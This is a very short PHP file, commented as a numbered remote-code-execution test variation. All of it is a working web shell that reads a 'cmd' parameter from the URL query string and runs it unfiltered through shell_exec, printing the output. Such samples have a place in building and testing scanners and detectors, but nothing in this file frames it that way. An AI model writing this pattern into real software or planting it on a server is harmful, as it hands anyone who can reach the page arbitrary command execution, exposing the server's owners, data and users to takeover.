<?php
// RCE test variation #130
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>